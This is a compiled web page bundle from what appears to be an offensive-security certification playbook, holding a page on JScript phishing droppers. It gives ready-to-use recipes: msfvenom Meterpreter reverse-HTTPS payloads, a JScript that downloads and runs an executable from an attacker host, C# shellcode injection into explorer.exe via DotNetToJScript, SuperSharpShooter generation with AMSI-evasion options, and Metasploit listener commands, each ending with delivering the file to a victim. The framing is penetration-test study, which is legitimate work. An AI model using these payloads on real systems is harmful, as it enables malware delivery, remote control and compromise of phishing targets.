"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[4652],{6799(e,t,n){n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>a});const r=JSON.parse('{"id":"osep/initial-access/phishing/JScript","title":"JScript","description":"Simple Meterpreter Dropper","source":"@site/docs/osep/initial-access/phishing/JScript.md","sourceDirName":"osep/initial-access/phishing","slug":"/osep/initial-access/phishing/JScript","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/JScript","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"title":"JScript","sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"Microsoft Word (Macros)","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word"},"next":{"title":"HTA","permalink":"/OSEP-Playbook/docs/osep/initial-access/phishing/HTA"}}');var s=n(4848),o=n(8453);const i={title:"JScript",sidebar_position:4},l=void 0,c={},a=[{value:"<strong>Simple Meterpreter Dropper</strong>",id:"simple-meterpreter-dropper",level:3},{value:"<strong>Meterpreter Loader with DotNetToJScript</strong>",id:"meterpreter-loader-with-dotnettojscript",level:3},{value:"<strong>Meterpreter with SuperSharpShooter</strong>",id:"meterpreter-with-supersharpshooter",level:3}];function d(e){const t={a:"a",code:"code",em:"em",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h3,{id:"simple-meterpreter-dropper",children:(0,s.jsx)(t.strong,{children:"Simple Meterpreter Dropper"})}),"\n",(0,s.jsxs)(t.p,{children:[(0,s.jsx)(t.strong,{children:"Important"}),"\xa0This will ONLY download the file to the victim, we still need to find another way to execute it."]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"Steps"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsx)(t.li,{children:"Craft your payload"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f exe -o pay.exe\n\n"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Create the\xa0",(0,s.jsx)(t.code,{children:".js"}),"\xa0file"]}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-jsx",children:'var url = "http://[ATTACKER_IP]/pay.exe"\nvar Object = WScript.CreateObject(\'MSXML2.XMLHTTP\');\n\nObject.Open(\'GET\', url, false);\nObject.Send();\n\nif (Object.Status == 200)\n{\n    var Stream = WScript.CreateObject(\'ADODB.Stream\');\n\n    Stream.Open();\n    Stream.Type = 1;\n    Stream.Write(Object.ResponseBody);\n    Stream.Position = 0;\n\n    Stream.SaveToFile("pay.exe", 2);\n    Stream.Close();\n}\n\nvar r = new ActiveXObject("WScript.Shell").Run("pay.exe");\n\n'})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsx)(t.li,{children:"Start your listener"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Find a way to deliver this script to the user, keep in mind that this one will only download it, we still need to find a way for the system to execute the\xa0",(0,s.jsx)(t.code,{children:".exe"})]}),"\n"]}),"\n",(0,s.jsx)(t.h3,{id:"meterpreter-loader-with-dotnettojscript",children:(0,s.jsx)(t.strong,{children:"Meterpreter Loader with DotNetToJScript"})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"Steps"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Download the DotNetToJScript project from\xa0",(0,s.jsx)(t.a,{href:"https://github.com/tyranid/DotNetToJScript",children:"GitHub"})]}),"\n",(0,s.jsx)(t.li,{children:"Craft your payload code"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] EXITFUNC=thread -f csharp\n\n"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Modify the code in\xa0",(0,s.jsx)(t.code,{children:"TestClass.cs"}),"\xa0and enter your payload"]}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-csharp",children:'using System;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Linq;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Windows.Forms;\n//using System.Threading.Tasks;\n\n[ComVisible(true)]\npublic class TestClass\n{\n\n    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport("kernel32.dll")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport("kernel32.dll")]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n    public TestClass()\n    {\n        Process[] expProc = Process.GetProcessesByName("explorer");\n        int pid = expProc[0].Id;\n        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);\n        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);\n\n        // INSERT YOUR PAYLOAD HERE\n        byte[] buf = new byte[760] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,\n0xcc,0x00,0x00,...,0x51,0x56,0x48,\n0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};\n\n        IntPtr outSize;\n\n        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);\n\n        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    }\n\n    public void RunProcess(string path)\n    {\n        Process.Start(path);\n    }\n}\n\n'})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["In the file\xa0",(0,s.jsx)(t.code,{children:"Program.cs"}),"\xa0comment the following lines (154-158)"]}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-csharp",children:'if (Environment.Version.Major != 2)\n{\n    WriteError("This tool should only be run on v2 of the CLR");\n    Environment.Exit(1);\n}\n\n'})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Compile the whole project for\xa0",(0,s.jsx)(t.em,{children:"Release"})]}),"\n",(0,s.jsxs)(t.li,{children:["Run the tool to get the\xa0",(0,s.jsx)(t.code,{children:".js"}),"\xa0code"]}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-powershell",children:".\\DotNetToJScript\\bin\\x64\\Release\\DotNetToJScript.exe .\\ExampleAssembly\\bin\\x64\\Release\\ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js\n\n"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsx)(t.li,{children:"Start your listener"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Find a way to deliver the\xa0",(0,s.jsx)(t.code,{children:".js"}),"\xa0file to the user and that he executes it, then you should get your reverse shell."]}),"\n"]}),"\n",(0,s.jsx)(t.h3,{id:"meterpreter-with-supersharpshooter",children:(0,s.jsx)(t.strong,{children:"Meterpreter with SuperSharpShooter"})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.strong,{children:"Steps"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Download the SuperSharpShooter project from\xa0",(0,s.jsx)(t.a,{href:"https://github.com/ScriptIdiot/SuperSharpShooter",children:"GitHub"})]}),"\n",(0,s.jsx)(t.li,{children:"Craft your Meterpreter payload"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o shell.txt\n\n"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Run the tool to obtain the\xa0",(0,s.jsx)(t.code,{children:".js"}),"\xa0code, other options like AMSI evasion are available in the documentation of the GitHub"]}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.txt --payload js --output payload\n\n"})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsx)(t.li,{children:"Start your listener"}),"\n"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,s.jsxs)(t.ol,{children:["\n",(0,s.jsxs)(t.li,{children:["Find a way to deliver the\xa0",(0,s.jsx)(t.code,{children:".js"}),"\xa0file to the user and that he executes it, then you should get your reverse shell."]}),"\n"]})]})}function h(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453(e,t,n){n.d(t,{R:()=>i,x:()=>l});var r=n(6540);const s={},o=r.createContext(s);function i(e){const t=r.useContext(o);return r.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function l(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(o.Provider,{value:t},e.children)}}}]);